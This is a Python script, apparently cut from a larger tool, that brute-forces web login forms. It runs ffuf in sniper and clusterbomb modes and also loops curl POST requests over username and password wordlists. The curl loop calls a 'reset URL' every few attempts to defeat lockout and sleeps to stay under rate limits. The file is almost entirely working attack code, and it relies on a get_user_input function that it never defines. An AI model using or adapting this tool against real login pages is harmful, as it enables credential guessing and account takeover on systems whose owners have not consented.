#!/usr/bin/env python3
import os
import subprocess
import time
from colorama import Fore, Style

def sniper_mode(target_url, fuzz_param, wordlist_path, output_file=None, max_attempts=4, sleep_duration=5):
    """
    Run ffuf in sniper mode to fuzz one parameter with rate limiting
    """
    print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Starting sniper mode brute-forcing...")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Target URL: {target_url}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Fuzzing parameter: {fuzz_param}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Wordlist: {wordlist_path}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Rate limiting: {max_attempts} attempts, {sleep_duration}s sleep")

    # Build ffuf command for sniper mode
    cmd = [
        'ffuf',
        '-u', target_url,
        '-w', f'{wordlist_path}:FUZZ',
        '-mr', 'Invalid',  # Match response for invalid (adjust as needed)
        '-c'  # Color output
    ]

    if output_file:
        cmd.extend(['-o', output_file, '-of', 'json'])

    try:
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Running command: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Sniper mode completed successfully")
            print(result.stdout)
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Sniper mode failed")
            print(f"Error: {result.stderr}")

        # Apply rate limiting sleep
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Rate limiting: Sleeping for {sleep_duration} seconds...")
        time.sleep(sleep_duration)

        return result.returncode == 0

    except FileNotFoundError:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} ffuf not found. Please ensure it's installed.")
        return False
    except Exception as e:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Error running sniper mode: {e}")
        return False

def cluster_mode(request_file, username_wordlist, password_wordlist, output_file=None, max_attempts=4, sleep_duration=5):
    """
    Run ffuf in clusterbomb mode to fuzz both username and password with rate limiting
    """
    print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Starting cluster mode brute-forcing...")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Request file: {request_file}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Username wordlist: {username_wordlist}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Password wordlist: {password_wordlist}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Rate limiting: {max_attempts} attempts, {sleep_duration}s sleep")

    # Build ffuf command for clusterbomb mode
    cmd = [
        'ffuf',
        '-request', request_file,
        '-request-proto', 'http',
        '-w', f'{username_wordlist}:FUZZ',
        '-w', f'{password_wordlist}:FUZ2Z',
        '-mode', 'clusterbomb',
        '-mr', 'Invalid',  # Match response for invalid (adjust as needed)
        '-c'  # Color output
    ]

    if output_file:
        cmd.extend(['-o', output_file, '-of', 'json'])

    try:
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Running command: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Cluster mode completed successfully")
            print(result.stdout)
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Cluster mode failed")
            print(f"Error: {result.stderr}")

        # Apply rate limiting sleep
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Rate limiting: Sleeping for {sleep_duration} seconds...")
        time.sleep(sleep_duration)

        return result.returncode == 0

    except FileNotFoundError:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} ffuf not found. Please ensure it's installed.")
        return False
    except Exception as e:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Error running cluster mode: {e}")
        return False

def curl_brute_force(url, username_file, password_file, reset_url=None, max_attempts=4, sleep_duration=5):
    """
    Brute force with curl, mimicking the bash script with rate limiting
    """
    print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Starting curl-based brute-forcing...")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Target URL: {url}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Username file: {username_file}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Password file: {password_file}")
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Rate limiting: {max_attempts} attempts, {sleep_duration}s sleep")

    attempts = 0

    try:
        with open(username_file, 'r') as user_f:
            for user_line in user_f:
                user = user_line.strip()
                if not user:
                    continue

                with open(password_file, 'r') as pass_f:
                    for pass_line in pass_f:
                        password = pass_line.strip()
                        if not password:
                            continue

                        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Trying: {user}:{password}")

                        # Make the request
                        cmd = [
                            'curl', '-s', '-X', 'POST', url,
                            '-H', 'Content-Type: application/x-www-form-urlencoded',
                            '-d', f'username={user}&password={password}'
                        ]

                        result = subprocess.run(cmd, capture_output=True, text=True)

                        # Check if response doesn't contain "Incorrect" (adjust as needed)
                        if "Incorrect" not in result.stdout:
                            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Potential success: {user}:{password}")
                            print(result.stdout)

                        attempts += 1

                        # Reset after max_attempts
                        if attempts >= max_attempts:
                            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Resetting database (attempt {attempts})")
                            if reset_url:
                                reset_cmd = ['curl', '-s', reset_url]
                                subprocess.run(reset_cmd, capture_output=True, text=True)
                            attempts = 0

                            # Sleep for rate limiting
                            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Sleeping for {sleep_duration} seconds...")
                            time.sleep(sleep_duration)

        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Brute-forcing completed")

    except FileNotFoundError as e:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} File not found: {e}")
        return False
    except Exception as e:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Error in curl brute-forcing: {e}")
        return False

    return True

def run_sniper_mode():
    """Interactive sniper mode setup"""
    print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Sniper Mode - Fuzz one parameter")
    print("="*50)

    target_url = get_user_input("Enter target URL (e.g., http://example.com/login?username=FUZZ): ")
    fuzz_param = get_user_input("Enter parameter to fuzz (username/password): ").lower()

    if fuzz_param not in ['username', 'password']:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Invalid parameter. Choose 'username' or 'password'.")
        return

    wordlist_path = get_user_input("Enter wordlist path: ")
    if not os.path.exists(wordlist_path):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Wordlist not found: {wordlist_path}")
        return

    output_file = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Output file path (leave empty for no file): ").strip()
    output_file = output_file if output_file else None

    # Rate limiting options
    max_attempts_input = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Max attempts before sleep (default 4): ").strip()
    max_attempts = int(max_attempts_input) if max_attempts_input.isdigit() else 4

    sleep_duration_input = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Sleep duration in seconds (default 5): ").strip()
    sleep_duration = int(sleep_duration_input) if sleep_duration_input.isdigit() else 5

    sniper_mode(target_url, fuzz_param, wordlist_path, output_file, max_attempts, sleep_duration)

def run_cluster_mode():
    """Interactive cluster mode setup"""
    print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Cluster Mode - Fuzz username and password")
    print("="*50)

    request_file = get_user_input("Enter request file path (req.txt): ")
    if not os.path.exists(request_file):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Request file not found: {request_file}")
        return

    username_wordlist = get_user_input("Enter username wordlist path: ")
    if not os.path.exists(username_wordlist):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Username wordlist not found: {username_wordlist}")
        return

    password_wordlist = get_user_input("Enter password wordlist path: ")
    if not os.path.exists(password_wordlist):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Password wordlist not found: {password_wordlist}")
        return

    output_file = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Output file path (leave empty for no file): ").strip()
    output_file = output_file if output_file else None

    # Rate limiting options
    max_attempts_input = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Max attempts before sleep (default 4): ").strip()
    max_attempts = int(max_attempts_input) if max_attempts_input.isdigit() else 4

    sleep_duration_input = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Sleep duration in seconds (default 5): ").strip()
    sleep_duration = int(sleep_duration_input) if sleep_duration_input.isdigit() else 5

    cluster_mode(request_file, username_wordlist, password_wordlist, output_file, max_attempts, sleep_duration)

def run_curl_brute_force():
    """Interactive curl-based brute force setup"""
    print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Curl-Based Brute Force - With Rate Limiting")
    print("="*50)

    url = get_user_input("Enter target URL (e.g., http://localhost.com/labs/a0x03.php): ")
    username_file = get_user_input("Enter username wordlist path: ")
    if not os.path.exists(username_file):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Username wordlist not found: {username_file}")
        return

    password_file = get_user_input("Enter password wordlist path: ")
    if not os.path.exists(password_file):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Password wordlist not found: {password_file}")
        return

    reset_url = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Reset URL (leave empty if none): ").strip()
    reset_url = reset_url if reset_url else None

    # Rate limiting options
    max_attempts_input = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Max attempts before sleep (default 4): ").strip()
    max_attempts = int(max_attempts_input) if max_attempts_input.isdigit() else 4

    sleep_duration_input = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Sleep duration in seconds (default 5): ").strip()
    sleep_duration = int(sleep_duration_input) if sleep_duration_input.isdigit() else 5

    curl_brute_force(url, username_file, password_file, reset_url, max_attempts, sleep_duration)
